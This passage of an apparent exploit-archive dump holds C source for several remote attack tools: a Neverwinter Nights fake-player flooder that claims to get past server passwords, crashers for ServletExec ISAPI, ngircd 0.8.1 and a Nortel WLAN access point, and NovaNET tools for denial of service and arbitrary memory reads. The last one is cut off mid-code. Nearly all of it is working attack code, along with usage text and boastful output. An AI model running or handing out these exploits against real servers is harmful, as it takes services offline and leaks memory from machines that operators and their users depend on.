        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}




    #define close   closesocket
    #define FIVESEC 5000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define FIVESEC 5
#endif



#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        5121
#define TIMEOUT     3
#define NICKSZ      8   // if you modify here, you must modify pck1 too!

#define SEND(x)     if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err(); \
                    fputc('.', stdout);
#define RECV        if(timeout(sd) < 0) { \
                        fputs("\n" \
                            "Error: socket timeout, no reply received\n" \
                            "\n", stdout); \
                        exit(1); \
                    } \
                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len < 0) std_err(); \
                    fputc('.', stdout);



int find_gamever(u_char *data, int len);
int create_rand_string(u_char *data, int len, u_int tmp);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    u_int       seed;
    int         sd,
                i,
                len,
                on = 1,
                special   = 0,
                info_only = 0,
                ser_ver   = 0;
    u_short     port = PORT;
    u_char      buff[BUFFSZ],
                query[] =
                    "\xfe\xfd\x00\x00\x00\x00\x00\xff\x00\x00",
                srvname[] =
                    "BNES"
                    "\x00\x14"
                    "\x00",
                info[] =
                    "BNXI"
                    "\x00\x14",
                pck1[] =
                    "BNCS"
                    "\x00\x14"
                    "\x10"
                    "\x00\x00\x00\x00"  // 8062 = version
                    "\x03\x00"
                    "\x01"
                    "\x00\x00\x00\x00"  // random
                    "\x08" "abcdefgh"   // NICKSZ and nickname
                    "\x08" "00000000",  // cd-key
                pck2[] =
                    "BNVS"
                    "\x50\x03"
                    "\x28" "0000000000000000000000000000000000000000"
                    "\x28" "0000000000000000000000000000000000000000"
                    "\x28" "0000000000000000000000000000000000000000"
                    "\x20" "00000000000000000000000000000000"
                    "\x20" "00000000000000000000000000000000";


    setbuf(stdout, NULL);

    fputs("\n"
        "Neverwinter Nights special Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host>\n"
            "\n"
            "Options:\n"
            "-p PORT   server port (default %d)\n"
            "-s        special attack, you will be able to consume all the server sockets\n"
            "          simply sending less than 100 packets each time. This type of attack\n"
            "          is useful because the admin cannot easily ban your IP and is fast.\n"
            "          It is automatically enabled if the server is protected by password.\n"
            "       -> This is the ONLY way to fill an internet server!!! Without this\n"
            "          option you can fill only local servers!\n"
            "-i        informations only, requests remote informations and exits\n"
            "-v VER    server version, by default this tool automatically retrieves the\n"
            "          exact remote version (needed for the attack)\n"
            "\n"
            " Works also versus servers protected by password without knowing the keyword!\n"
            "\n", argv[0], port);
        exit(1);
    }

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 's': special = 1; break;
            case 'i': info_only = 1; break;
            case 'v': ser_ver = atoi(argv[++i]); break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
            }
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr  = resolv(argv[argc]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    SEND(srvname);
    RECV;
    if(memcmp(buff, "BNER", 4)) {
        fputs("\nError: bad reply from the server\n\n", stdout);
        exit(1);
    }
    buff[buff[8] + 9] = 0x00;
    printf("\n"
        "  Server name                %s\n", buff + 9);

    SEND(info);
    RECV;
    close(sd);

    if(memcmp(buff, "BNXR", 4)) {
        fputs("\nError: bad reply from the server\n\n", stdout);
        exit(1);
    }
    buff[buff[19] + 20] = 0x00;
    printf("\n"
        "  Game port                  %d\n"
        "  Player Password            %s\n"
        "  Levels                     %d -> %d\n"
        "  Players                    %d / %d\n"
        "  Local Characters Allowed   %s\n"
        "  Player vs Player           %s\n"
        "  Players Pause Enabled      %s\n"
        "  Only One Party             %s\n"
        "  Enforce Legal Characters   %s\n"
        "  Item Level Restrictions    %s\n"
        "  Module                     %s\n"
        "\n",
        *(u_short *)(buff + 4),
        buff[7] ? "on" : "off",
        buff[8], buff[9],
        buff[10], buff[11],
        buff[12] ? "on" : "off",
        buff[13] ? "party or full" : "none",
        buff[14] ? "on" : "off",
        buff[15] ? "on" : "off",
        buff[16] ? "on" : "off",
        buff[17] ? "on" : "off",
        buff + 20);

    if(info_only) return(0);

    if(!ser_ver) {
        fputs("- retrieve server version (needed!):\n", stdout);
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        *(u_long *)(query + 3) = peer.sin_addr.s_addr;  // something random
        SEND(query);
        RECV;
        close(sd);
        ser_ver = find_gamever(buff, len);
        if(ser_ver <= 0) {
            fputs("\n"
                "Error: no gamever field found, you must manually specify the server version\n"
                "       with the -v option\n"
                "\n", stdout);
            exit(1);
        }
    }

    printf("\n- server version             %d\n", ser_ver);
    *(u_long *)(pck1 + 7) = ser_ver;

    seed = time(NULL);

    fputs("- start attack:\n", stdout);
    for(;;) {
        for(i = 0;; i++) {
            if(special) printf("\n  Packet %d: ", i);
              else fputs("\n  Player: ", stdout);

            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if(sd < 0) std_err();

            if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
              < 0) std_err();
            peerl.sin_port++;
            if(bind(sd, (struct sockaddr *)&peerl, sizeof(peerl))
              < 0) std_err();

            *(u_long *)(pck1 + 14) = peerl.sin_port;
            seed = create_rand_string(pck1 + 19, NICKSZ, seed);     // random nick
            seed = create_rand_string(pck1 + 20 + NICKSZ, 8, seed); // random cd-key

            SEND(pck1);
            RECV;
            if(buff[6] != 0x56) {
                if(buff[7] == 5) {
                    close(sd);
                    break;
                } else if(buff[7] == 2) {
                    fputs("\nError: wrong version, server uses another version (check the -v option)\n\n", stdout);
                    exit(1);
                } else if(buff[7] == 6) {
                    fputs("\nAlert: a player with a same name already exists, I wait 5 seconds and retry\n", stdout);
                    close(sd);
                    sleep(FIVESEC);
                    continue;
                } else if(buff[7] == 10) {
                    fputs("\nError: you are banned on this server\n\n", stdout);
                    exit(1);
                } else if(buff[7] == 12) {
                    fputs("\nError: your nickname contains wrong chars\n\n", stdout);
                    exit(1);
                } else if(buff[7] == 32) {
                    fputs("- password protection, I bypass it", stdout);
                    close(sd);
                    continue;
                } else {
                    printf("\nError: the fake player has not been accepted (error %d)\n\n", buff[7]);
                    exit(1);
                }
            }

            if(special) {
                close(sd);
                continue;
            }

            RECV;

            seed = create_rand_string(pck2 + 7,   40, seed);
            seed = create_rand_string(pck2 + 48,  40, seed);
            seed = create_rand_string(pck2 + 89,  40, seed);
            seed = create_rand_string(pck2 + 130, 32, seed);
            seed = create_rand_string(pck2 + 163, 32, seed);

            SEND(pck2);
            RECV;

            if(!memcmp(buff, "BNVRR", 5)) {
                fputs("\n"
                    "Error: the player seems to have not been accepted.\n"
                    "       Remember that you must use the special attack (-s option) to fill\n"
                    "       internet servers!\n"
                    "\n", stdout);
            }

            close(sd);
        }

        fputs("- server full", stdout);
        sleep(FIVESEC);
    }

    return(0);
}



int find_gamever(u_char *data, int len) {
    int     nt = 0,
            ver = -1;
    u_char  *p,
            *limit;

    limit = data + len;
    data += 5;
    while(data < limit) {
        p = strchr(data, 0x00);
        if(!p) break;
        *p = 0x00;

        if(!nt) {
            if(!*data) break;
            if(!strcmp(data, "gamever")) ver = 0;
            nt++;
        } else {
            if(!ver) ver = atoi(data);
            nt = 0;
        }
        data = p + 1;
    }
    return(ver);
}



int create_rand_string(u_char *data, int len, u_int tmp) {
    if(!tmp) tmp++;
    while(len--) {
        tmp = (*data + tmp) % 62;
        if(tmp <= 9) {
            *data = tmp + '0';
        } else if((tmp >= 10) && (tmp <= 35)) {
            *data = (tmp - 10) + 'A';
        } else {
            *data = (tmp - 36) + 'a';
        }
        data++;
    }
    return(tmp << 1);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2004-12-01]
source: http://www.securityfocus.com/bid/4796/info

ServletExec/ISAPI is a plug-in Java Servlet/JSP engine for Microsoft IIS. It runs with IIS on Microsoft Windows NT/2000/XP systems.

A denial of service condition occurs when the JSPServlet is sent an overly long request either directly or via a request for a JSP file.

It has been reported that this will cause the underlying webserver to crash.

This condition may be the result of insufficient bounds checking, though this possibility has not been confirmed. 

#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>

/*    This is Exploit code for a vulnerability in NewAtlanta ServletExec ISAPI 4.1.
      ServletExec 4.1 ISAPI is a Java Servlet/JSP Engine for Internet Information
      Server and is implemented as an ISAPI filter.
      Machines running this program is MS IIS server 4 and 5.
	  This code can simple crash the server, successfully preform a DoS attack!
	  It sends a string that servletExec don't like but have to eat, and 
	  this will make the server crash, BIG TIME =)
	  This file assuming the www server is on port 80 and that the servlet engine
	  is located in the /Servlet directory. 
	  Jonas "bl0wfi5h" Nyberg and Digital-Root.com is proud to present ServletExecCrash.
	  You can contact me at: bl0wfi5h@digital-root.com or bl0wfi5h@hotmail.com.
	  This was finished: 2002-05-24 @21:49 Swedish time
*/

void banner(void);

typedef unsigned short int USHORT;
typedef unsigned long int ULONG;



int main(int argc, char** argv[])
{
  int sockfd;
  struct sockaddr_in dest_addr;

  
  int len, bytes_sent, select;
  char* string = "GET /Servlet/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.jsp";
 
  if(argc < 2 || argc > 2)
  {
  	printf("Usage: ./servletExecCrash ip\n");
  	printf("Assuming that its port 80, which is default for most www servers\n");
  	printf("If this is a case where this is not true, change the got damn source yourself!\n");
  	exit(1);
  }
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_port = htons(80);
  inet_aton(argv[1], &(dest_addr.sin_addr));
  memset(&(dest_addr.sin_zero), '\0',8);
  len = strlen(string);
  
  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1 ) 
  {
  	printf("problem with your socket!");
  	exit(1);
  }
  
  connect(sockfd, (struct sockaddr *)& dest_addr, sizeof(struct sockaddr));
  
 	
  bytes_sent = send(sockfd, string, len, 0);	
  if(bytes_sent == -1)
  {
    printf("\nYou are having problem sending, the information\n");
    exit(1);
  }
	printf("\nYou have sent: %d", bytes_sent);
	printf(" bytes to: %s", argv[1]);
	close(sockfd);	
	banner();
	return 0;

}
void banner(void)
{
	printf("\n\n***********************************************\n");
	printf("*****CODE MADE BY: JONAS [BL0wFi5h] NYBERG*******\n");
	printf("*********DIGITAL-ROOT PROUDLY PRESENT*************\n");
	printf("****************SERVLETEXECCRASH******************\n");
	printf("**************************************************\n");
	

}
/* Ip under usage is actually port /str0ke */

/* 
-=[x0n3-h4ck]=--=[00:48:19]=--=[/root]=--=[Account: root]=-

-=[#]  ./ngircd_dos x0n3-h4ck.org 12345 Angel DarkChan

-=[ NGircd <= 0.8.1 Remote DoS ::: Coded by Expanders ]=-

Connecting to target    ...[Done]
Building evil buffer        ...[Done]
Sending NICK               ...[Done]
Sending USER               ...[Done]
Joining Channel            ...[Done]
Sending evil request    ...[Done]
Trying to reconnect      ...[Done] -> Attack Success! Lets party!

The Irc Server is Killed !!

Exploit:

     NGircd <= 0.8.1     Remote Denial Of Service       Coded by: Expanders

     Usage:  ./ngircd_dos <Host> <Ip> <NickToUse> <ChannellToJoin>

  NOTE:  The channel must be EMPTY to let the exploit use +I mode

     Example:

*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void help(char *program_name);

int main(int argc, char *argv[]) {
    struct sockaddr_in trg;
    struct hostent *he;
long addr;
    int sockfd, buff,rc;
char evilbuf[1024];
char buffer[1024];
char *nick="AntiServer";
char *channel="Die_NGircd";
char *request;
if(argv[3] != NULL) nick=argv[3];
if(argv[4] != NULL) channel=argv[4];
if(argc < 3 ) {
 help(argv[0]);
 exit(0);
}
printf("\n\n-=[ NGircd <= 0.8.1 Remote DoS ::: Coded by Expanders ]=-\n");
    he = gethostbyname(argv[1]);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    request = (char *) malloc(12344);
    trg.sin_family = AF_INET;
    trg.sin_port = htons(atoi(argv[2]));
    trg.sin_addr = *((struct in_addr *) he->h_addr);
    memset(&(trg.sin_zero), '\0', 8);
printf("\n\nConnecting to target \t...");
rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));
if(rc==0)
{
 printf("[Done]\nBuilding evil buffer\t...");
 memset(evilbuf,65,300);
 memset(evilbuf+300,64,1);
 memset(evilbuf+301,65,128);
 printf("[Done]\nSending NICK           \t...");
 sprintf(request,"NICK %s\n",nick);
 send(sockfd,request,strlen(request),0);
 printf("[Done]\nSending USER           \t...");
 sprintf(request,"USER %s x0n3-h4ck.org eth0.x0n3-h4ck.org
:%s\n",nick,nick);
 send(sockfd,request,strlen(request),0);
 buff=recv(sockfd, buffer, 256, 0);
 printf("[Done]\nJoining Channel        \t...");
 sprintf(request,"JOIN #%s\n",channel);
 send(sockfd,request,strlen(request),0);
 printf("[Done]\nSending evil request   \t...");
 sprintf(request,"MODE #%s +I %s\n",channel,evilbuf);
 send(sockfd,request,strlen(request),0);
 sprintf(request,"QUIT www.x0n3-h4ck.org\n",evilbuf);
 send(sockfd,request,strlen(request),0);
 sleep(2);
 printf("[Done]\nTrying to reconnect\t...");
 close(sockfd);
 sockfd = socket(AF_INET, SOCK_STREAM, 0);
 sleep(1);
 rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));
 if(rc==0)
  printf("[Fail] -> Damn! Attack Failed!\n\n");
 else
  printf("[Done] -> Attack Success! Lets party!\n\n");
}
else
 printf("[Fail] -> Unable to connect\n\n");
close(sockfd);
return 0;

}

void help(char *program_name) {

printf("\n\t-=[      NGircd <= 0.8.1 Remote Denial Of Service      ]=-\n");
printf("\t-=[                                                    ]=-\n");
printf("\t-=[      Coded by
ders -/www.x0n3-h4ck.org\\-      ]=-\n\n");
printf("Usage: %s <Host> <Ip> <NickToUse>
<ChannellToJoin>\n",program_name);
}

// milw0rm.com [2005-02-05]
source: http://www.securityfocus.com/bid/9787/info

Nortel Wireless LAN Access Point 2200 series appliances have been reported to be prone to a remote denial of service vulnerability. The issue is reported to present itself when a large network request is handled by one of the Wireless LAN Access Point default administration services. This will reportedly cause the Access Point Appliance Operating service to crash, effectively denying service to legitimate users.

/* WLAN-DoS.c
 *
 * Nortel Networks Wireless LAN Access Point 2200 DoS + PoC
 * discovered by Alex Hernandez.
 *
 * Copyright (C) 2004  Alex Hernandez.
 *
 * A successful attack on a vulnerable server can cause the AP
 * (Access Point) listener to fail and crash. The port 23 (telnet)
 * functionality cannot be restored until the listener is manually restarted.
 *
 * LAN AP 2200 permits client-server communication across any network.
 * LAN enables by default the port 23 (telnet) and port (80) for administering.
 * Debugging features are enabled by default, if LAN AP encounters such a request,
 * it will crash and no longer field AP requests from authorized clients.
 *
 * Simple lame code by
 *
 * -Mark Ludwik :Germany
 *
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
 if(argc < 3) {
  printf("\nWLAN NortelNetworks AP DoS exploit by Mark Ludwik\n\n");
  printf("Usage: WlanDoS [AP/Host] [port]\n\n");
  exit(-1);
 }

 int sock;
 char explbuf[2024];
 struct sockaddr_in dest;
 struct hostent *he;

 if((he = gethostbyname(argv[1])) == NULL) {
  printf("Couldn't resolve %s!\n", argv[1]);
  exit(-1);
 }

 if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
  perror("socket()");
  exit(-1);
 }

 printf("\nWLAN NortelNetworks AP DoS exploit by Mark Ludwik\n\n");

 dest.sin_addr = *((struct in_addr *)he->h_addr);
 dest.sin_port = htons(atoi(argv[2]));
 dest.sin_family = AF_INET;

 printf("[+] Exploit buffer.\n");
 memset(explbuf, 'A', 2024);
 memcpy(explbuf+2024, "\n\n\n\n\n\n\n\n", 8);

 if(connect(sock, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1) {
  perror("connect()");
  exit(-1);
 }

 printf("[+] Connected...\n");
 printf("[+] Sending DoS attack...!\n");

 send(sock, explbuf, strlen(explbuf), 0);
 sleep(2);
 close(sock);
 printf("\n[+] Crash was successful !\n");
 return(0);
}
source: http://www.securityfocus.com/bid/39693/info

NovaStor NovaNET is prone to code-execution, denial-of-service, and information-disclosure vulnerabilities.

An attacker can exploit these issues to execute arbitrary code, access sensitive information, or crash the affected application, denying service to legitimate users. Successful attacks may result in the complete compromise of an affected computer.

NovaNET 11 and 12 are vulnerable to all of these issue; NovaBACKUP Network 13 is affected by a denial-of-service vulnerability.

/* novanet-read.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * NovaSTOR NovaNET remote DoS + arbitrary memory read
 * by mu-b - Fri Sep 14 2007
 *
 * - Tested on: NovaSTOR NovaNET 11.0
 *
 * Note: this was silently fixed in NovaBACKUP NETWORK 13.0
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

#define BUF_SIZE              0x92

#define NOVANET_INT_IDX       32
#define NOVANET_OFFSET        0x100EC480
#define NOVANET_CALC_INT(a)   (((int) (a)-NOVANET_OFFSET-16)/sizeof (int))
#define NOVANET_SET_INT(a,b)  *((unsigned int *) &a[NOVANET_INT_IDX]) = b;
#define NOVANET_TCP_PORT      3817
#define USLEEP_TIME           100000

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      perror ("send()");
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  return (recv (fd, dst, len, 0));
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      perror ("connect()");
      return (-1);
    }

  return (fd);
}

static void
novanet_pkt_init (char *pkt)
{
  char *ptr = pkt;

  /* add packet header */
  *ptr++ = 0x54;
  *ptr++ = 0x84;

  /* add padding */
  memset (ptr, 0x00, 0x1E);
  ptr   += 0x1E;

  /* add our dodgy-int */
  memset (ptr, 0x69, sizeof (int));
  ptr   += sizeof (int);

  memset (ptr, 0x00, BUF_SIZE-(ptr-pkt));
}

static void
novanet_read (char *host, void *start, void *end, int is_dos)
{
  int sock, i, num_hits;
  char buf[BUF_SIZE], rbuf[BUF_SIZE];

  novanet_pkt_init (buf);

  start = (void *) NOVANET_CALC_INT (start);
  end = (void *) NOVANET_CALC_INT (end);

  if (!is_dos)
    printf ("start: %p end: %p\n", start, end);

  num_hits = is_dos ? 1 : (end - start);
  printf ("+hitting %s:%d. (%d times)\n", host, NOVANET_TCP_PORT, num_hits);

  for (i = 0; i < num_hits; i++, start++)
    {
      sock = sockami (host, NOVANET_TCP_PORT);
      if (sock == -1)
        break;

      NOVANET_SET_INT (buf, (is_dos ? NOVANET_CALC_INT (0xdeadbeef) : (unsigned int) start));
      sock_send (sock, buf, sizeof buf);

      if (!is_dos)
        {
          sock_recv (sock, rbuf, sizeof rbuf);
          write (fileno (stderr), &rbuf[NOVANET_INT_IDX], sizeof (int));
          usleep (USLEEP_TIME);
          close (sock);

          if (!((i + 1) % 8))
            printf ("..%d", i + 1);

          fflush (stdout);
        }
    }

  printf ("\n");
}

int
main (int argc, char **argv)
{
  void *start, *end;

  printf ("NovaSTOR NovaNET remote DoS + arbitrary memory read\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if ((argc % 2) == 1 ||
      (argc > 3 && (sscanf (argv[2], "0x%p", &start) != 1 ||
                    sscanf (argv[3], "0x%p", &end) != 1)))
    {
      fprintf (stderr, "Usage: %s <host> [[start] [end]]\n"
                       "Note: not specifying [[start] [end]] results in DoS!\n\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if (argc > 3)
    printf ("dumping from: %p -> %p (%d-bytes) to stderr\n", start, end, (int) (end - start));

  novanet_read (argv[1], start, end, !(argc > 3));

  return (EXIT_SUCCESS);
}
source: http://www.securityfocus.com/bid/39693/info
   
NovaStor NovaNET is prone to code-execution, denial-of-service, and information-disclosure vulnerabilities.
   
An attacker can exploit these issues to execute arbitrary code, access sensitive information, or crash the affected application, denying service to legitimate users. Successful attacks may result in the complete compromise of an affected computer.
   
NovaNET 11 and 12 are vulnerable to all of these issue; NovaBACKUP Network 13 is affected by a denial-of-service vulnerability.

/* novanet-dos.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * NovaSTOR NovaNET/NovaBACKUP <= 13.0 remote DoS
 * by mu-b - Tue Oct 2 2007
 *
 * - Tested on: NovaSTOR NovaNET 11.0(SP*)
 *              NovaSTOR NovaNET 12.0(SP*)
 *              NovaSTOR NovaNET 13.0
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define NOVANET_HDR_SZ        0x14
#define NOVANET_PKT_SZ        0x92
#define NOVANET_MAX_LEN       0x112014

#define NOVANET_TCP_PORT      3817
#define USLEEP_TIME           100000

static char hdr_pkt[] =
  "\x54\x84\x00\x00"                            /* 04 */
  "\x00\x00\x00\x00"                            /* 08 */
  "\x04\x00\x00\x00"                            /* 0C */
  "\x92\x00\x00\x00"                            /* 10 */
  "\x00\x00\x00\x00"                            /* 14 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 08 */  /* 1C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 10 */  /* 24 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 18 */  /* 2C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 20 */  /* 34 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 28 */  /* 3C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 30 */  /* 44 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 38 */  /* 4C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 40 */  /* 54 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 48 */  /* 5C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 50 */  /* 64 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 58 */  /* 6C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 60 */  /* 74 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 68 */  /* 7C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 70 */  /* 84 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 78 */  /* 8C */
  "\x00\x00\x00\x00\x00\x00";         /* 7E */  /* 92 */

static char rem_pkt[] =
  "\x51\x84\x00\x00"    /* 04 */
  "\x00\x00\x00\x30"    /* 08 */
  "\x05\x00\x00\x00"    /* 0C */
  "\x00\x00\x00\x00"    /* 10 */
  "\x00\x00\x00\x00";   /* 14 */

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      fprintf (stderr, "sock_send: send() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  int n;
  if ((n = recv (fd, dst, len, 0)) < 0)
    {
      fprintf (stderr, "sock_recv: recv() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      fprintf (stderr, "sockami: socket() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      fprintf (stderr, "sockami: gethostbyname() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      fprintf (stderr, "sockami: connect() - %s\n", strerror (errno));
      return (-1);
    }

  return (fd);
}

int
main (int argc, char **argv)
{
  char rbuf_pkt[NOVANET_PKT_SZ];
  unsigned int rlen;
  int fd, n;

  printf ("NovaSTOR NovaNET remote DoS\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  fd = sockami (argv[1], NOVANET_TCP_PORT);
  if (fd == -1)
    {
      fprintf (stderr, "main: sockami failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("* connected to %s:%d\n", argv[1], NOVANET_TCP_PORT);

  printf ("** sending header packet...");
  if ((n = sock_send (fd, hdr_pkt, sizeof hdr_pkt - 1)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "main: sock_send returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading first reply...");
